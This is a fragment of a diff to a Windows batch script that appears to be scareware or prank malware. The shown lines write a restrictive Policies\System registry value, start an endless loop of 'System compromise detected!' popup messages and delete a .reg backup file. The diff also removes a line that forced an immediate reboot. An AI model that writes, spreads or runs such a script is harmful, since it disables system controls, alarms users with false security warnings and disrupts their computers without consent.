@@ -15,5 +15,5 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Dis
 
 start cmd /c "for /l %%x in () do msg * WARNING: System compromise detected!"
 timeout 3 >nul
-shutdown /r /t 0
+
 del cursors_backup.reg >nul
